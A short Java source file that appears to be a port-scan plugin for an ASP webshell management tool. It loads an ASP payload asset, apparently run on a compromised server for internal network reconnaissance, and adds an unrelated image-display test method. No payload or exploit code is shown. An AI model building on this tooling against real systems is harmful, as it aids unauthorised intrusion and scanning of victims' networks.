package shells.plugins.asp;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import javax.swing.*;
import shells.plugins.generic.PortScan;
import util.functions;

@PluginAnnotation(
        payloadName = "AspDynamicPayload",
        Name = "PortScan",  // You must use a constant value here
        DisplayName = "端口扫描"
)
public class APortScan extends PortScan {

    private static final String CLASS_NAME = "PortScan";

    public APortScan() {
        // Constructor logic if needed
    }

    // Method to read plugin data
    public byte[] readPlugin() throws IOException {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.asp", "PortScan"));
        return functions.readInputStreamAutoClose(inputStream);
    }

    // Method to return the class name
    public String getClassName() {
        return "PortScan";
    }

    // Method to load and display the image (non-static, updated logic)
    public void displayImage() {
        // Using getResource() to load the image from resources
        java.net.URL imgURL = this.getClass().getResource("./chat.ico");
        if (imgURL != null) {
            ImageIcon icon = new ImageIcon(imgURL);
            JLabel label = new JLabel(icon);
            JFrame frame = new JFrame();
            frame.add(label);
            frame.setSize(400, 400);
            frame.setVisible(true);
        } else {
            System.out.println("Image not found!");
        }
    }

    // Main method to test image loading
    public static void main(String[] args) {
        APortScan portScan = new APortScan();
        portScan.displayImage();  // Display the image when running the program
    }
}
